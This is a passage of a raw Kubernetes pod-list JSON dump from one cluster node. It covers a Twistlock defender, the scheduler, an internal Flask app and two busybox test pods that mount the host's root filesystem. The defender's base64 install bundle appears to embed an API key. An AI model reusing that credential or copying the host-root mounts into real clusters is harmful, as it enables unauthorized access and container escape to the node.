:{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/lib/twistlock\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/lib/twistlock/certificates\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/run\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:hostNetwork":{},"f:hostPID":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"certificates\"}":{".":{},"f:name":{},"f:secret":{".":{},"f:defaultMode":{},"f:secretName":{}}},"k:{\"name\":\"cri-data\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"cri-rke2-data\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"data-folder\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"docker-sock-folder\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"passwd\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"runc-proxy-sock-folder\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"syslog-socket\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T06:57:22Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"192.168.213.128\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"certificates","secret":{"secretName":"twistlock-secrets","defaultMode":256}},{"name":"syslog-socket","hostPath":{"path":"/dev/log","type":""}},{"name":"data-folder","hostPath":{"path":"/var/lib/twistlock","type":""}},{"name":"passwd","hostPath":{"path":"/etc/passwd","type":""}},{"name":"docker-sock-folder","hostPath":{"path":"/var/run","type":""}},{"name":"cri-data","hostPath":{"path":"/var/lib/containerd","type":""}},{"name":"cri-rke2-data","hostPath":{"path":"/var/lib/rancher/rke2/agent/containerd","type":""}},{"name":"runc-proxy-sock-folder","hostPath":{"path":"/run","type":""}},{"name":"kube-api-access-7skh2","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"twistlock-defender","image":"registry-auth.twistlock.com/tw_sbtny1wjnkl07hzcyeukukgv6jmiquak/twistlock/defender:defender_34_02_133","env":[{"name":"WS_ADDRESS","value":"wss://asia-southeast1.cloud.twistlock.com:443"},{"name":"DEFENDER_TYPE","value":"cri"},{"name":"LOG_PROD","value":"true"},{"name":"SYSTEMD_ENABLED","value":"false"},{"name":"DOCKER_CLIENT_ADDRESS","value":"/var/run/docker.sock"},{"name":"DEFENDER_CLUSTER_ID","value":"819e8d8c-5fc4-9295-088b-0444e5a1019a"},{"name":"DEFENDER_CLUSTER_NAME_RESOLVING_METHOD","value":"default"},{"name":"DEFENDER_CLUSTER"},{"name":"MONITOR_SERVICE_ACCOUNTS","value":"true"},{"name":"MONITOR_ISTIO","value":"false"},{"name":"COLLECT_POD_LABELS","value":"false"},{"name":"INSTALL_BUNDLE","value":"eyJzZWNyZXRzIjp7fSwiZ2xvYmFsUHJveHlPcHQiOnsiaHR0cFByb3h5IjoiIiwibm9Qcm94eSI6IiIsImNhIjoiIiwidXNlciI6IiIsInBhc3N3b3JkIjp7ImVuY3J5cHRlZCI6IiJ9fSwiY3VzdG9tZXJJRCI6ImF3cy1zaW5nYXBvcmUtOTYxMTQ2ODQzIiwiYXBpS2V5IjoiWENFTncrYUVKNGYwcndWZFUzS1NIQSs4dDRNa1kvRTV0ZklpbTFWZ2c0ZUx6THExRndFb0VVU01pcHNSL2pGaGhJYkJRdTRvM0tzK1VLVVMzVjZLMmc9PSIsIm1pY3Jvc2VnQ29tcGF0aWJsZSI6ZmFsc2V9"},{"name":"HOST_CUSTOM_COMPLIANCE_ENABLED","value":"false"},{"name":"CLOUD_HOSTNAME_ENABLED","value":"false"},{"name":"FIPS_ENABLED","value":"false"}],"resources":{"limits":{"cpu":"900m","memory":"512Mi"},"requests":{"cpu":"256m","memory":"512Mi"}},"volumeMounts":[{"name":"data-folder","mountPath":"/var/lib/twistlock"},{"name":"certificates","mountPath":"/var/lib/twistlock/certificates"},{"name":"docker-sock-folder","mountPath":"/var/run"},{"name":"passwd","readOnly":true,"mountPath":"/etc/passwd"},{"name":"syslog-socket","mountPath":"/dev/log"},{"name":"cri-data","mountPath":"/var/lib/containerd"},{"name":"cri-rke2-data","mountPath":"/var/lib/rancher/rke2/agent/containerd"},{"name":"runc-proxy-sock-folder","mountPath":"/run"},{"name":"kube-api-access-7skh2","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_ADMIN","NET_RAW","SYS_ADMIN","SYS_PTRACE","SYS_CHROOT","MKNOD","SETFCAP","IPC_LOCK"]},"privileged":false,"readOnlyRootFilesystem":true,"appArmorProfile":{"type":"Unconfined"}}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirstWithHostNet","serviceAccountName":"twistlock-service","serviceAccount":"twistlock-service","nodeName":"longth-cluster","hostNetwork":true,"hostPID":true,"securityContext":{},"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchFields":[{"key":"metadata.name","operator":"In","values":["longth-cluster"]}]}]}}},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/disk-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/memory-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/pid-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/unschedulable","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/network-unavailable","operator":"Exists","effect":"NoSchedule"}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-24T06:20:58Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:03Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-09-24T06:20:58Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2025-09-24T06:20:58Z","containerStatuses":[{"name":"twistlock-defender","state":{"running":{"startedAt":"2026-03-30T02:05:03Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:21Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://fe9337b0db4c7232d2f6cba96d3795266217356d3fd02eab41d05fb9b899fe7b"}},"ready":true,"restartCount":47,"image":"registry-auth.twistlock.com/tw_sbtny1wjnkl07hzcyeukukgv6jmiquak/twistlock/defender:defender_34_02_133","imageID":"registry-auth.twistlock.com/tw_sbtny1wjnkl07hzcyeukukgv6jmiquak/twistlock/defender@sha256:deecfeb48292b445f4c54bf16c678da8f3314bb35b5f87137e096210d85caf3b","containerID":"containerd://d3d0e1aadcfbabdf02ae9d9675ad6ba99314ca4dd034d0ce8e70b91f4a6b07d6","started":true,"volumeMounts":[{"name":"data-folder","mountPath":"/var/lib/twistlock"},{"name":"certificates","mountPath":"/var/lib/twistlock/certificates"},{"name":"docker-sock-folder","mountPath":"/var/run"},{"name":"passwd","mountPath":"/etc/passwd","readOnly":true,"recursiveReadOnly":"Disabled"},{"name":"syslog-socket","mountPath":"/dev/log"},{"name":"cri-data","mountPath":"/var/lib/containerd"},{"name":"cri-rke2-data","mountPath":"/var/lib/rancher/rke2/agent/containerd"},{"name":"runc-proxy-sock-folder","mountPath":"/run"},{"name":"kube-api-access-7skh2","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"hostpath-test-pod","namespace":"default","uid":"42ac09e5-c69b-4dfe-a748-ece60196711b","resourceVersion":"376660","creationTimestamp":"2025-12-22T07:18:11Z","annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"hostpath-test-pod\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"command\":[\"sh\",\"-c\",\"sleep 3600\"],\"image\":\"busybox\",\"name\":\"test\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-volume\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-volume\"}]}}\n","kubernetes.io/config.seen":"2026-03-30T02:05:02.211823328Z","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"v1","time":"2025-12-22T07:18:11Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"test\"}":{".":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/host\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"host-volume\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T07:57:38Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"10.244.0.165\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"host-volume","hostPath":{"path":"/","type":"Directory"}},{"name":"kube-api-access-mvznt","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"test","image":"busybox","command":["sh","-c","sleep 3600"],"resources":{},"volumeMounts":[{"name":"host-volume","mountPath":"/host"},{"name":"kube-api-access-mvznt","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"default","serviceAccount":"default","nodeName":"longth-cluster","securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:17Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-12-22T07:18:11Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:05:20Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:05:20Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-12-22T07:18:11Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.181","podIPs":[{"ip":"10.244.0.181"}],"startTime":"2025-12-22T07:18:11Z","containerStatuses":[{"name":"test","state":{"running":{"startedAt":"2026-03-30T03:05:19Z"}},"lastState":{"terminated":{"exitCode":0,"reason":"Completed","startedAt":"2026-03-30T02:05:16Z","finishedAt":"2026-03-30T03:05:16Z","containerID":"containerd://8b9283974e91d98900ffdab15bfa8093d1e8c6a4d9fc13220c86a89111f86eb9"}},"ready":true,"restartCount":69,"image":"docker.io/library/busybox:latest","imageID":"docker.io/library/busybox@sha256:1487d0af5f52b4ba31c7e465126ee2123fe3f2305d638e7827681e7cf6c83d5e","containerID":"containerd://3f380807857da27210ac0339d5fd4f248ea172e98c6b7d02837cde810d49b230","started":true,"volumeMounts":[{"name":"host-volume","mountPath":"/host"},{"name":"kube-api-access-mvznt","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"BestEffort"}},{"metadata":{"name":"internal-processor-597cf7b7fc-knxpc","generateName":"internal-processor-597cf7b7fc-","namespace":"corp-internal","uid":"ae30ea07-fcda-42b7-8b64-129789778362","resourceVersion":"387124","creationTimestamp":"2026-03-30T03:40:32Z","labels":{"app":"internal-processor","pod-template-hash":"597cf7b7fc"},"annotations":{"kubectl.kubernetes.io/restartedAt":"2026-03-30T03:32:06Z","kubernetes.io/config.seen":"2026-03-30T03:40:32.855054041Z","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"ReplicaSet","name":"internal-processor-597cf7b7fc","uid":"2b9480f6-9a03-4ad8-8e23-57548a9b77ba","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2026-03-30T03:40:32Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/restartedAt":{}},"f:generateName":{},"f:labels":{".":{},"f:app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"2b9480f6-9a03-4ad8-8e23-57548a9b77ba\"}":{}}},"f:spec":{"f:automountServiceAccountToken":{},"f:containers":{"k:{\"name\":\"app\"}":{".":{},"f:args":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:livenessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":8080,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{".":{},"f:limits":{".":{},"f:cpu":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:drop":{}}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/app\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{".":{},"f:fsGroup":{},"f:runAsNonRoot":{}},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"code\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:name":{}},"f:name":{}}}}}}]},"spec":{"volumes":[{"name":"code","configMap":{"name":"internal-app-code","defaultMode":420}},{"name":"kube-api-access-rrmvz","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"app","image":"python:3.11-slim","command":["/bin/sh","-c"],"args":["pip install --no-cache-dir flask \u0026\u0026\npython /app/app.py\n"],"ports":[{"name":"http","containerPort":8080,"protocol":"TCP"}],"resources":{"limits":{"cpu":"300m","memory":"256Mi"},"requests":{"cpu":"100m","memory":"128Mi"}},"volumeMounts":[{"name":"code","mountPath":"/app"},{"name":"kube-api-access-rrmvz","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"livenessProbe":{"httpGet":{"path":"/healthz","port":8080,"scheme":"HTTP"},"initialDelaySeconds":15,"timeoutSeconds":1,"periodSeconds":20,"successThreshold":1,"failureThreshold":3},"readinessProbe":{"httpGet":{"path":"/healthz","port":8080,"scheme":"HTTP"},"initialDelaySeconds":5,"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"drop":["ALL"]},"allowPrivilegeEscalation":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"app-sa","serviceAccount":"app-sa","automountServiceAccountToken":true,"nodeName":"longth-cluster","securityContext":{"runAsNonRoot":false,"fsGroup":1000},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:40:33Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:40:32Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:40:43Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:40:43Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:40:32Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.195","podIPs":[{"ip":"10.244.0.195"}],"startTime":"2026-03-30T03:40:32Z","containerStatuses":[{"name":"app","state":{"running":{"startedAt":"2026-03-30T03:40:33Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"docker.io/library/python:3.11-slim","imageID":"docker.io/library/python@sha256:d6e4d224f70f9e0172a06a3a2eba2f768eb146811a349278b38fff3a36463b47","containerID":"containerd://22950b16f3d0b3fda71077d36228d73efe0f33dc8712b63ecb297cbdd0b17e6b","started":true,"volumeMounts":[{"name":"code","mountPath":"/app"},{"name":"kube-api-access-rrmvz","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-scheduler-longth-cluster","namespace":"kube-system","uid":"4e03651370c94e2eaa73d763186a0943","creationTimestamp":null,"labels":{"component":"kube-scheduler","tier":"control-plane"},"annotations":{"kubernetes.io/config.hash":"4e03651370c94e2eaa73d763186a0943","kubernetes.io/config.seen":"2026-03-30T02:04:56.212876118Z","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"kubeconfig","hostPath":{"path":"/etc/kubernetes/scheduler.conf","type":"FileOrCreate"}}],"containers":[{"name":"kube-scheduler","image":"registry.k8s.io/kube-scheduler:v1.31.13","command":["kube-scheduler","--authentication-kubeconfig=/etc/kubernetes/scheduler.conf","--authorization-kubeconfig=/etc/kubernetes/scheduler.conf","--bind-address=127.0.0.1","--kubeconfig=/etc/kubernetes/scheduler.conf","--leader-elect=true"],"resources":{"requests":{"cpu":"100m"}},"volumeMounts":[{"name":"kubeconfig","readOnly":true,"mountPath":"/etc/kubernetes/scheduler.conf"}],"livenessProbe":{"httpGet":{"path":"/healthz","port":10259,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"startupProbe":{"httpGet":{"path":"/healthz","port":10259,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"longth-cluster","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:57Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:10Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:10Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:04:56Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"192.168.213.128","podIPs":[{"ip":"192.168.213.128"}],"startTime":"2026-03-30T02:04:56Z","containerStatuses":[{"name":"kube-scheduler","state":{"running":{"startedAt":"2026-03-30T02:04:57Z"}},"lastState":{"terminated":{"exitCode":255,"reason":"Unknown","startedAt":"2026-03-27T06:57:14Z","finishedAt":"2026-03-30T02:04:45Z","containerID":"containerd://c3aa1004e60969067ed5082e320cde19541e5e5bd1646e784e7c397fe19062b2"}},"ready":true,"restartCount":50,"image":"registry.k8s.io/kube-scheduler:v1.31.13","imageID":"registry.k8s.io/kube-scheduler@sha256:c5ce150dcce2419fdef9f9875fef43014355ccebf937846ed3a2971953f9b241","containerID":"containerd://41722c33758a3f2a6d22e1101733c25bc7c97930f35449803088f6300954be8f","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"hostpath-test","namespace":"default","uid":"e0bf1533-b4db-4169-99cc-5f745251578a","resourceVersion":"376666","creationTimestamp":"2025-12-22T06:47:25Z","labels":{"run":"hostpath-test"},"annotations":{"kubernetes.io/config.seen":"2026-03-30T02:05:02.211831113Z","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"kubectl-run","operation":"Update","apiVersion":"v1","time":"2025-12-22T06:47:25Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:labels":{".":{},"f:run":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"test\"}":{".":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/host\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"host\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}},{"manager":"kubelet","operation":"Update","apiVersion":"v1","time":"2026-03-27T07:57:40Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"PodReadyToStartContainers\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:hostIPs":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"10.244.0.166\"}":{".":{},"f:ip":{}}},"f:startTime":{}}},"subresource":"status"}]},"spec":{"volumes":[{"name":"host","hostPath":{"path":"/","type":""}},{"name":"kube-api-access-nl2gm","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"test","image":"busybox","command":["sleep","3600"],"resources":{},"volumeMounts":[{"name":"host","mountPath":"/host"},{"name":"kube-api-access-nl2gm","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"default","serviceAccount":"default","nodeName":"longth-cluster","securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T02:05:19Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-12-22T06:47:25Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:05:22Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:05:22Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2025-12-22T06:47:25Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.182","podIPs":[{"ip":"10.244.0.182"}],"startTime":"2025-12-22T06:47:25Z","containerStatuses":[{"name":"test","state":{"running":{"startedAt":"2026-03-30T03:05:21Z"}},"lastState":{"terminated":{"exitCode":0,"reason":"Completed","startedAt":"2026-03-30T02:05:18Z","finishedAt":"2026-03-30T03:05:18Z","containerID":"containerd://2221c437dc8b9d8ab652f66be666fd4739d1bed0fefef7ffebcbc3d52a3d7f0b"}},"ready":true,"restartCount":69,"image":"docker.io/library/busybox:latest","imageID":"docker.io/library/busybox@sha256:1487d0af5f52b4ba31c7e465126ee2123fe3f2305d638e7827681e7cf6c83d5e","containerID":"containerd://451b3e104c4e0a94